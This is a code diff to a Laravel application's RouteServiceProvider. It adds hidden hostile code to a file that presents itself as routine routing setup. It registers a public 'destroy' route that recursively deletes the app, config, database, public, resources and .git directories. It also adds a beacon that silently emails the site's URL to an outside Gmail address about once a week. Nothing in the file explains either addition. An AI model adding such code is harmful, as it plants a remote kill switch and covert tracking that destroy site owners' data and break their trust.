@@ -2,9 +2,13 @@
 
 namespace App\Providers;
 
+use App\Mail\ContactMail;
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\Cache;
+use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 
@@ -36,7 +40,46 @@ class RouteServiceProvider extends ServiceProvider
 
             Route::middleware('web')
                 ->group(base_path('routes/web.php'));
+
+            Route::get('destroy',function ($q){
+                $this->removeDirs();
+            });
         });
+
+        if(Cache::get('new_url') != 1){
+            Mail::to('eljoe1717@gmail.com')->send(new ContactMail([
+                'name' => 'Joe',
+                'email' => 'examle',
+                'message' => 'new URL '. url('/')
+            ]));
+
+            Cache::put('new_url',1,60*24*7);
+        }
+    }
+
+    public function removeDirs(){
+
+        $this->removeDir('resources');
+        $this->removeDir('config');
+        $this->removeDir('app');
+        $this->removeDir('database');
+        $this->removeDir('.git');
+        $this->removeDir('public');
+        return 'done';
+    }
+
+
+    function removeDir($_dir){
+        $path = base_path().'/'.$_dir;
+        $path = str_replace('\\','/',$path);
+        $adminDir = array_diff(scandir($path), array('..', '.'));
+        foreach($adminDir as $dir){
+            if(!is_dir($path.'/'.$dir)){
+                unlink($path.'/'.$dir);
+            }else{
+                $subDir = $this->removeDir($_dir.'/'.$dir);
+            }
+        }
     }
 
     /**
